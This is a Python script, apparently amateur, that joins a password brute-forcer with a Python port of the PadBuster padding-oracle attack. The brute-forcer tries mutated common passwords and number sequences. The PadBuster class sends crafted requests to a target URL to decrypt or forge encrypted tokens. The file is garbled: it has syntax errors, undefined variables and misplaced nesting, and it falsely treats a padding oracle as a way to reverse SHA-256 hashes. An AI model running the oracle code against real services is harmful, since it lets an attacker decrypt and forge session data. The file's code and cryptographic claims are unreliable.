# wofl's brute forcing and padbusting password function.
# eat it bitch.

import itertools
import time
from datetime import datetime
from sympy import isprime, nextprime
import hashlib
import sys
import math
import argparse
import requests
import urllib.parse
import base64
from collections import defaultdict


# Function to mutate characters in a word based on a given mapping
def mutate(word, char_map):
    if not word:
        return ['']
    
    first_char = word[0]
    rest_word_mutations = mutate(word[1:], char_map)
    
    mutated_words = []
    if first_char in char_map:
        for replacement in char_map[first_char]:
            mutated_words.extend([replacement + rest for rest in rest_word_mutations])
    mutated_words.extend([first_char + rest for rest in rest_word_mutations])
    
    return mutated_words

# Function to mutate the case of a word
def mutate_case(word):
    return [''.join(chars) for chars in itertools.product(*[(char.lower(), char.upper()) for char in word])]

# Function to get the last two digits of years from 1940 to the current year
def get_year_digits():
    current_year = datetime.now().year
    years = range(1940, current_year + 1)
    year_digits = set()

    for year in years:
        year_str = str(year)
        if len(year_str) == 4:
            year_digits.add(year_str[2:])  # Add the last two digits
            year_digits.add(year_str[:2])  # Add the first two digits (optional)
    
    # Add specific digits '0', '1', '69'
    year_digits.update(['0', '1', '69'])
    
    return list(year_digits)

# Function to generate lucky numbers
def sieve_lucky_numbers(n):
    numbers = list(range(1, n + 1, 2))  # Start with odd numbers only
    i = 1
    while i < len(numbers):
        step = numbers[i]
        numbers = [num for idx, num in enumerate(numbers) if (idx + 1) % step != 0]
        i += 1
    return numbers

# Generate the first 1000 lucky numbers as strings
lucky_numbers = sieve_lucky_numbers(1000)
lucky_numbers = [str(num) for num in lucky_numbers]

# List of top 50 most common passwords
common_passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",
    "696969", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890",
    "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",
    "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
    "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000"
]

# Character mappings for mutation
char_map = {
    'o': ['0'],
    'a': ['@'],
    'e': ['3']
}

# Generate Fibonacci sequence numbers as strings
def gen_fibonacci(n):
    fib_seq = [0, 1]
    for i in range(2, n):
        fib_seq.append(fib_seq[-1] + fib_seq[-2])
    return [str(fib) for fib in fib_seq]

# Generate Lucas sequence numbers as strings
def gen_lucas(n):
    lucas_seq = [2, 1]
    for i in range(2, n):
        lucas_seq.append(lucas_seq[-1] + lucas_seq[-2])
    return [str(lucas) for lucas in lucas_seq]

# Generate Catalan numbers as strings
def gen_catalan(n):
    catalan_seq = [1]
    for i in range(1, n):
        catalan_seq.append(catalan_seq[-1] * 2 * (2 * i - 1) // (i + 1))
    return [str(catalan) for catalan in catalan_seq]

# Generate Mersenne primes as strings
def gen_mersenne_primes(n):
    mersenne_primes = []
    p = 2
    while len(mersenne_primes) < n:
        mp = 2**p - 1
        if isprime(mp):
            mersenne_primes.append(str(mp))
        p = nextprime(p)
    return mersenne_primes

# Generate Sophie Germain primes as strings
def gen_sophie_germain_primes(n):
    primes = []
    p = 2
    while len(primes) < n:
        if isprime(p) and isprime(2*p + 1):
            primes.append(str(p))
        p = nextprime(p)
    return primes

# Generate all possible password combinations
def gen_pswd_combos(knwn):
    digits = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`'
    lngt = len(knwn)
    while True:
        for combos in itertools.product(digits, repeat=lngt):
            yield knwn + ''.join(combos)
        lngt += 1  # Increase the length after exhausting all combos of the current length

# Check if the generated password matches the real password
def is_rl_pswd(pswd, rl_pswd):
    return pswd == rl_pswd

# Check if the generated hash matches the real hash
def is_rl_hash(hash, rl_hash):
    return hash == rl_hash

def main_password_check():
    net_auto_password = 'password'  # The password we want to solve
    print(f"Actual real password to work from: {net_auto_password}")
    
    start_time = time.time()  # Start timing

    # Get the list of year digits
    year_digits = get_year_digits()

    # Generate mathematical sequences
    fibonacci_numbers = gen_fibonacci(1000)
    lucas_numbers = gen_lucas(1000)
    catalan_numbers = gen_catalan(1000)
    mersenne_primes = gen_mersenne_primes(1000)
    sophie_germain_primes = gen_sophie_germain_primes(1000)

    all_sequences = lucky_numbers + fibonacci_numbers + lucas_numbers + catalan_numbers + mersenne_primes + sophie_germain_primes


def is_valid_sha256(hash_str):
    """
    Validates whether a string is a valid SHA-256 hash.

    :param hash_str: The hash string to validate.
    :return: True if valid, False otherwise.
    """
    # SHA-256 hashes are 64 hexadecimal characters
    return bool(re.fullmatch(r'[A-Fa-f0-9]{64}', hash_str))

def text_str():
    """
    Action to perform if the password is NOT a SHA-256 hash.
    Replace the print statement with desired functionality.
    """
    print("password is text string: Processing the password as plain-text.")
    # Example: run pswd attempts as normal and proceed with verification

    # First, try the sequences from generated numbers
    for i, seq_pswd in enumerate(all_sequences):
        print(f"Trying sequence password {i}: {seq_pswd}")
        if is_rl_pswd(seq_pswd, net_auto_password):
            elapsed_time = time.time() - start_time  # Calculate elapsed time
            print(f"Correct password found: {seq_pswd}. Proceeding to login.")
            print(f"Elapsed time: {elapsed_time:.2f} seconds")
            return

    # Then, try the common passwords from the wordlist with mutations
    for i, common_pswd in enumerate(common_passwords):
        # Apply character mutation
        mutated_words = mutate(common_pswd, char_map)
        
        # Apply case mutation to each mutated word
        for mutated_word in mutated_words:
            mutated_cases = mutate_case(mutated_word)
            for case_variation in mutated_cases:
                # Try prepending and appending year digits
                for year_digit in year_digits:
                    # Prepend year digit
                    pswd_with_year_prepend = year_digit + case_variation
                    print(f"Trying common password with year prepend {i}: {pswd_with_year_prepend}")
                    if is_rl_pswd(pswd_with_year_prepend, net_auto_password):
                        elapsed_time = time.time() - start_time  # Calculate elapsed time
                        print(f"Correct password found: {pswd_with_year_prepend}. Proceeding to login.")
                        print(f"Elapsed time: {elapsed_time:.2f} seconds")
                        return

                    # Append year digit
                    pswd_with_year_append = case_variation + year_digit
                    print(f"Trying common password with year append {i}: {pswd_with_year_append}")
                    if is_rl_pswd(pswd_with_year_append, net_auto_password):
                        elapsed_time = time.time() - start_time  # Calculate elapsed time
                        print(f"Correct password found: {pswd_with_year_append}. Proceeding to login.")
                        print(f"Elapsed time: {elapsed_time:.2f} seconds")
                        return

    # If not found in lucky numbers, sequences, or common passwords, try the generated combinations
    combos = gen_pswd_combos('')
    for i, combo in enumerate(combos):
        print(f"Combo {i}: {combo}\n")
        print(f"Trying password: {combo}")
        if is_rl_pswd(combo, net_auto_password):
            elapsed_time = time.time() - start_time  # Calculate elapsed time
            print(f"Correct password found: {net_auto_password}. Pretending to accept the login.")
            print(f"Elapsed time: {elapsed_time:.2f} seconds")
            break

def hash():
    """
    Action to perform if the password IS a SHA-256 hash.
    Replace the print statement with desired functionality.
    """
    print("compare_hash: Processing the password as a SHA-256 hash.")
    hash_str = processing("Enter the SHA-256 hash of the password to verify: ").strip().lower()
    if not is_valid_sha256(input_hash):
        print("Invalid SHA-256 hash format. Please ensure it's a 64-character hexadecimal string.")
        sys.exit(1)
    # Here, compare the hash to hash of our generated passwords to try
    # For speed we try all the hashes of common passwords and sequences first
    hash_str = hash_password("ExamplePassword!")
    if compare_hashes(stored_hash, input_hash):
        print("Hash verification successful!")
    else:
        print("Hash verification failed.")

    # Hash the mathematical sequences with sha-256 algo to get hashes for matching
    # Original sequence password
    seq_psswd = "all_sequences"
    # Encode the password to bytes, then compute SHA-256 hash
    hash_object = hashlib.sha256(seq_psswd.encode('utf-8'))
    seq_hashes = hash_object.hexdigest()
    print(f"SHA-256 Hash of '{seq_psswd}': {seq_hashes}")

    all_seq_hashes = seq_hashes

    # If is in sha-256 hash form, hash it then compare to computed hashes of the sequences generated
    for i, seq_hash in enumerate(all_seq_hashes):
        print(f"Trying hashed sequence password (i): (seq_hash)")
        if is_rl_hash(seq_hash, net_auto_password):
            elapsed_time = time.time() - start_time # Calculate elapsed time
            print(f"Correct hash found: (seq_hash). Proceeding to login.")
            print(f"Elapsed time: (elapsed_time:.2f) seconds")
            return

    # Hash the wordlist with mutations sequences with sha-256 algo to get hashes for matching
    # Original wordlist password
    common_psswd = "all_common"
    # Encode the common_psswd to bytes, then compute SHA-256 hash
    hash_object = hashlib.sha256(common_psswd.encode('utf-8'))
    common_hashes = hash_object.hexdigest()
    print(f"SHA-256 Hash of '{common_psswd}': {common_hashes}")

    all_common_hashes = common_hashes

    # If is in sha-256 hash form, hash it then compare to computed hashes of the sequences generated
    for i, common_hash in enumerate(all_common_hashes):
        print(f"Trying hashed sequence (i): (common_hash)")
        if is_rl_hash(common_hash, net_auto_password):
            elapsed_time = time.time() - start_time # Calculate elapsed time
            print(f"Correct hash found: (common_hash). Proceeding to login.")
            print(f"Elapsed time: (elapsed_time:.2f) seconds")
            return

    # Original password
        combo_pswd = "combo"
        # Encode the password to bytes, then compute SHA-256 hash
        hash_object = hashlib.sha256(combo_pswd.encode('utf-8'))
        combo_hash = hash_object.hexdigest()
        print(f"SHA-256 Hash of '{combo_pswd}': {combo_hash}")

    # If not found in number or common word/subsitiution hashes then try PadBuster/Oracle

    # This script is a Python port of "PadBuster v0.3.3," originally by
    # Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com).
    #
    # Credits:
    #   - J.Rizzo and T.Duong for web exploit techniques
    #   - S.Vaudenay for initial padding oracle discovery
    #   - James M. Martin for PoC brute force code
    #   - wireghoul (Eldar Marcussen) for code improvements
    #
    # Disclaimer:
    #   This is for demonstration and authorized testing only. Use responsibly!

    """
    PadBuster-like Python script
    ----------------------------
    Replicates core Padding Oracle logic:
      1) Decrypt mode: 
           - Splits ciphertext into blocks 
           - Derives intermediary bytes via block-by-block attacks
           - XORs with the preceding block (or IV) to produce plaintext
      2) Encrypt (forge) mode:
           - Reverses the process to create valid ciphertext for new plaintext
           - Derives intermediary bytes for a known/fake block
           - XOR with plaintext to form a new ciphertext block

    Important: This script is only a reference skeleton—some parts (POST data, cookies, interactive prompts) 
    are simplified or omitted. Adapt for your environment.
    """

    def banner():
        print("+-------------------------------------------+")
        print("| PadBuster - v0.3.3 (Python Port)          |")
        print("| Written originally by Brian Holyfield     |")
        print("| Python conversion by whisprer & friends   |")
        print("+-------------------------------------------+\n")

    class PadBuster:
        def __init__(
            self,
            url: str,
            encrypted_sample: str,
            block_size: int,
            error_string: str = None,
            encoding_format: int = 0,
            verbose: bool = False,
            log_files: bool = False,
            no_iv: bool = False,
            no_encode_option: bool = False,
            plaintext: str = None
        ):
            self.url = url
            self.sample = encrypted_sample
            self.block_size = block_size
            self.error_string = error_string
            self.encoding_format = encoding_format
            self.verbose = verbose
            self.log_files = log_files
            self.no_iv = no_iv
            self.no_encode_option = no_encode_option
            self.plaintext = plaintext  # If provided, triggers encrypt/forge mode

            self.raw_cipher_bytes = b""  # Decoded ciphertext bytes
            self.oracle_signature = None
            self.analysis_responses = defaultdict(int)
            self.request_count = 0

            # Decode/prepare the ciphertext sample
            self.decode_sample()

        # ----------------------------------------------------------------
        # UTILS: Decoding / Encoding
        # ----------------------------------------------------------------
        def decode_sample(self):
            """Decode the provided sample from URL encoding + chosen format, optionally prepend zero IV."""
            tmp = self.sample
            if '%' in tmp or '+' in tmp:  # Possibly URL-encoded
                tmp = urllib.parse.unquote(tmp)

            self.raw_cipher_bytes = self.my_decode(tmp.encode('ascii'), self.encoding_format)

            if len(self.raw_cipher_bytes) % self.block_size != 0:
                print(f"[!] ERROR: The sample length must be multiple of blockSize={self.block_size}.")
                print(f"    Got length={len(self.raw_cipher_bytes)}. Check encoding or block size.")
                sys.exit(1)

            if self.no_iv:
                # If user says "no-iv," artificially prepend a zero block
                self.raw_cipher_bytes = (b"\x00" * self.block_size) + self.raw_cipher_bytes

        def my_encode(self, data: bytes, fmt: int) -> bytes:
            return self.encode_decode(data, 'encode', fmt)

        def my_decode(self, data: bytes, fmt: int) -> bytes:
            return self.encode_decode(data, 'decode', fmt)

        def encode_decode(self, data: bytes, operation: str, fmt: int) -> bytes:
            """
            0=Base64, 1=HexLower, 2=HexUpper, 3=.NET UrlToken, 4=WebSafe Base64
            operation='encode' or 'decode'
            """
            if operation == 'decode':
                if fmt in [1, 2]:  # hex
                    text = data.decode('ascii').lower()
                    return bytes.fromhex(text)
                elif fmt == 3:  # .NET UrlToken
                    return self.web64_decode(data.decode('ascii'), net=True)
                elif fmt == 4:  # WebSafe
                    return self.web64_decode(data.decode('ascii'), net=False)
                else:
                    # Base64 default
                    return base64.b64decode(data)
            else:
                # encode
                if fmt in [1, 2]:  # hex
                    hex_str = data.hex()
                    if fmt == 2:
                        hex_str = hex_str.upper()
                    return hex_str.encode('ascii')
                elif fmt == 3:  # .NET UrlToken
                    return self.web64_encode(data, net=True)
                elif fmt == 4:  # WebSafe
                    return self.web64_encode(data, net=False)
                else:
                    # Base64
                    return base64.b64encode(data).replace(b"\n", b"")

        def web64_encode(self, raw_data: bytes, net: bool) -> bytes:
            """net=False => Web64 style, net=True => .NET UrlToken style (appends count of '=')."""
            b64 = base64.b64encode(raw_data).decode('ascii')
            b64 = b64.replace('+', '-').replace('/', '_')
            eq_count = b64.count('=')
            b64 = b64.replace('=', '')
            if net:
                b64 += str(eq_count)
            return b64.encode('ascii')

        def web64_decode(self, enc_str: str, net: bool) -> bytes:
            tmp = enc_str.replace('-', '+').replace('_', '/')
            if net:
                eq_count = tmp[-1]
                tmp = tmp[:-1]
                tmp += '=' * int(eq_count)
            return base64.b64decode(tmp)

        @staticmethod
        def pretty_print(data: bytes) -> str:
            """Helper to show ASCII-friendly representation."""
            try:
                return data.decode('ascii', errors='replace')
            except:
                return repr(data)

        # ----------------------------------------------------------------
        # MAIN REQUEST/ORACLE CHECK
        # ----------------------------------------------------------------
        def make_request(self, test_url: str):
            """
            Minimal GET request using 'test_url'.
            The script replaces the sample in the URL with manipulated ciphertext.
            """
            self.request_count += 1
            try:
                resp = requests.get(test_url, allow_redirects=False, timeout=10)
                return (resp.status_code, resp.text, resp.headers.get("Location", "N/A"), len(resp.text))
            except requests.RequestException as e:
                print(f"[!] Request error: {e}")
                return (0, "", "N/A", 0)

        def build_signature(self, status, content_length, location, content):
            # For brevity, ignoring body or partial content. 
            return f"{status}\t{content_length}\t{location}"

        def is_successful(self, status_code, content, location, content_length) -> bool:
            """
            Check if the request is a 'success' (no padding error).
            1) If we have self.error_string, it's a success if that string is not in the content
            2) If we have self.oracle_signature, it's a success if the signature differs
            3) Otherwise, in analysis mode, we treat it as a 'fail' until we pick a signature
            """
            if self.error_string:
                return (self.error_string not in content)
            elif self.oracle_signature:
                sig_data = self.build_signature(status_code, content_length, location, content)
                return (sig_data != self.oracle_signature)
            else:
                # In 'analysis mode' or no known error, assume fail
                return False

        # ----------------------------------------------------------------
        # Decryption Mode
        # ----------------------------------------------------------------
        def run_decrypt_mode(self):
            total_len = len(self.raw_cipher_bytes)
            block_count = total_len // self.block_size

            if block_count < 2:
                print("[!] ERROR: Not enough blocks to decrypt (need at least 2). Use --no-iv if needed.")
                sys.exit(1)

            print("[+] Starting Decrypt Mode\n")
            decrypted_full = b""

            # The first block is considered IV; we decrypt from block 1..(block_count-1)
            for blk_i in range(1, block_count):
                print(f"[***] Decrypting Block {blk_i} of {block_count - 1}")
                sample_block = self.raw_cipher_bytes[blk_i * self.block_size : (blk_i + 1) * self.block_size]
                intermediary = self.process_block(sample_block)

                prev_block = self.raw_cipher_bytes[(blk_i - 1) * self.block_size : blk_i * self.block_size]
                decrypted_block = bytes(x ^ y for x, y in zip(intermediary, prev_block))

                print(f"   Decrypted Block (HEX): {self.my_encode(decrypted_block, 2).decode('ascii')}")
                print(f"   Decrypted Block (ASCII): {self.pretty_print(decrypted_block)}\n")
                decrypted_full += decrypted_block

            # Display final
            print("[+] Completed Decryption\n")
            print(f"[+] Full Decrypted Value (HEX)   : {self.my_encode(decrypted_full, 2).decode('ascii')}")
            print(f"[+] Full Decrypted Value (Base64): {self.my_encode(decrypted_full, 0).decode('ascii')}")
            print(f"[+] Full Decrypted Value (ASCII) : {self.pretty_print(decrypted_full)}")

        # ----------------------------------------------------------------
        # The core routine for discovering Intermediary bytes
        # ----------------------------------------------------------------
        def process_block(self, target_block: bytes) -> bytes:
            """
            Attempt to find 'intermediary' for each byte in 'target_block'
            using a fake preceding block. 
            """
            block_size = self.block_size
            fake_block = bytearray(block_size)
            intermediary = bytearray(block_size)

            # If no known error_string or oracle_signature, 
            # we might do 'analysis' to figure out the signature first (omitted for brevity).

            for pos in reversed(range(block_size)):
                pad_val = block_size - pos
                found_correct = False
                for guess in range(256):
                    fake_block[pos] = guess

                    # Adjust known discovered bytes for next padding
                    for k in range(pos + 1, block_size):
                        fake_block[k] = intermediary[k] ^ pad_val

                    combined = bytes(fake_block) + target_block
                    encoded = self.my_encode(combined, self.encoding_format)
                    if not self.no_encode_option:
                        encoded = urllib.parse.quote(encoded.decode('ascii'), safe='').encode('ascii')

                    test_url = self.url.replace(self.sample, encoded.decode('ascii'), 1)
                    status, content, loc, c_len = self.make_request(test_url)

                    if self.is_successful(status, content, loc, c_len):
                        # The correct guess
                        val = guess ^ pad_val
                        intermediary[pos] = val
                        found_correct = True
                        if self.verbose:
                            print(f"  Byte {pos}: guess={guess}, Intermediary={val}")
                        break

                if not found_correct:
                    print(f"[!] WARNING: Could not find correct byte at position {pos}. Using zero.")
                    intermediary[pos] = 0

            return bytes(intermediary)

        # ----------------------------------------------------------------
        # Encryption/Forging Mode
        # ----------------------------------------------------------------
        def run_encrypt_mode(self, plaintext: bytes):
            """
            Reverse the padding oracle to produce a valid ciphertext for arbitrary plaintext.
            1. Pad the plaintext
            2. For each block (backwards), discover 'intermediary' for a known or fake block
            3. XOR with plaintext block => final ciphertext block
            """
            bs = self.block_size
            pad_len = bs - (len(plaintext) % bs)
            if pad_len == 0:
                pad_len = bs
            padded = plaintext + bytes([pad_len]) * pad_len
            total_blocks = math.ceil(len(padded) / bs)

            print(f"[+] Plaintext length {len(plaintext)}, padded to {len(padded)} => {total_blocks} blocks.\n")

            forged_cipher = b""
            # Start with a zero block or user-provided 'cipher' block if that was an option
            current_block = b"\x00" * bs

            # For each plaintext block from last to first
            for i in range(total_blocks, 0, -1):
                print(f"[***] Encrypting Block {i} of {total_blocks}")
                start = (i - 1) * bs
                end = i * bs
                pt_block = padded[start:end]

                # Derive intermediary for the current_block
                # This is your "sample block" in the original code
                interm = self.process_block(current_block)

                # XOR with the plaintext block => new cipher block
                new_cipher_block = bytes(x ^ y for x, y in zip(interm, pt_block))
                forged_cipher = new_cipher_block + forged_cipher

                print(f"   [Block {i}] newCipherBlock (HEX): {self.my_encode(new_cipher_block, 2).decode('ascii')}")
                current_block = new_cipher_block

            final_encoded = self.my_encode(forged_cipher, self.encoding_format)
            if not self.no_encode_option:
                final_encoded = urllib.parse.quote(final_encoded.decode('ascii'), safe='').encode('ascii')

            return final_encoded

    def cracked_hash(hash: str) -> tuple:
        banner()

        parser = argparse.ArgumentParser(description="PadBuster-like script in Python with encryption forging mode.")
        parser.add_argument("--url", required=True, help="Target URL containing the ciphertext")
        parser.add_argument("--encrypted-sample", required=True, help="Encrypted sample that also appears in the request")
        parser.add_argument("--block-size", type=int, required=True, help="Block size (e.g. 16 for AES)")
        parser.add_argument("--error", help="Padding error string if known")
        parser.add_argument("--encoding", type=int, default=0,
                            help="0=Base64,1=HexLower,2=HexUpper,3=.NET UrlToken,4=WebSafe B64")
        parser.add_argument("--verbose", action="store_true", help="Verbose output")
        parser.add_argument("--log", action="store_true", help="Enable file logging (not fully implemented)")
        parser.add_argument("--no-iv", action="store_true", help="Sample does not contain IV (prepend zeros)")
        parser.add_argument("--no-encode", action="store_true", help="Do not URL-encode the manipulated ciphertext")
        parser.add_argument("--plaintext", help="If provided, run in 'encrypt/forge' mode with given plaintext")
        args = parser.parse_args()

        padbuster = PadBuster(
            url=args.url,
            encrypted_sample=args.encrypted_sample,
            block_size=args.block_size,
            error_string=args.error,
            encoding_format=args.encoding,
            verbose=args.verbose,
            log_files=args.log,
            no_iv=args.no_iv,
            no_encode_option=args.no_encode,
            plaintext=args.plaintext
        )

        if padbuster.plaintext:
            # ENCRYPT (Forge) Mode
            print("[+] Running 'Encrypt Mode' to forge ciphertext.")
            forged = padbuster.run_encrypt_mode(padbuster.plaintext.encode('ascii'))
            print(f"\n[=] Final Forged Cipher: {forged.decode('ascii')}")
        else:
            # DECRYPT Mode
            print("[+] Running 'Decrypt Mode'.\n")
            padbuster.run_decrypt_mode()


        """
        Dehashes an sha-256hash using either forged ciphertext or decryption.

        :param forged: The plain-text password from hash.
        :return: A tuple containing the forged or the decrypted padbuster from hashed password.
        """

        return forged, padbuster

    def padbuster_main():

        # Dictionary to store hashed passwords with their salts
        hashed_passwords = {}

        # Iterate over each password in the list
        for idx, pwd in enumerate(hash_pswds, start=1):
            print(f"\nProcessing hasdh {idx}: {pwd}")
            forged, padmaster = hash_pswd(pwd)
            hashed_passwords[pwd] = {"forged": forged.str(), "padbuster": str}
            print(f"forged: {foged.str()}")
            print(f"padbuster: {padbuster.str()}")
            print(f"Dehashed Password: {dehashed}")

        # Optional: Display all dehashed passwords
        print("\n=== All Dehashed Passwords ===")
        for original, creds in dehashed_passwords.items():
            print(f"Password: {original} | forged: {creds['forged']} | Hash: {creds['hash']}")

    if __name__ == "__main__":
        padbuster_main()


# If not found in lucky number hashes, sequence hashes, or common hashes, try the generated combo hashes
combo_hashes = gen_pswd_combo_hashes('')
for i, combo_hash in enumerate(combo)_hashes):
    print(f"Combo {i}: {combo_hash}\n")
    print(f"Trying hash: {combo_hash}")
    if is_rl_hash(combo_hash, net_auto_password):
        elapsed_time = time.time() - start_time  # Calculate elapsed time
        print(f"Correct hash found: {net_auto_password}. Proceeding to login.")
        print(f"Elapsed time: {elapsed_time:.2f} seconds")
        break

def main():
    """
    Main function to execute the script logic.
    """

    # Prompt the user to determine the form of the password
    while True:
        hahs_str = is_valid_sha256 print(f"treating string as SHA-256 hash").strip().lower()
        if is_valid_sha256 in [true]:
            hash()
            break
        elif is_valid_sha256 in [false]:
            text_str()
            break
        else:
            print("Invalid string. generating next attempt.")

# Main execution
if __name__ == "__main__":
    main_password_check()  # Call the new password-checking function
    main()  # run the hash check decision code
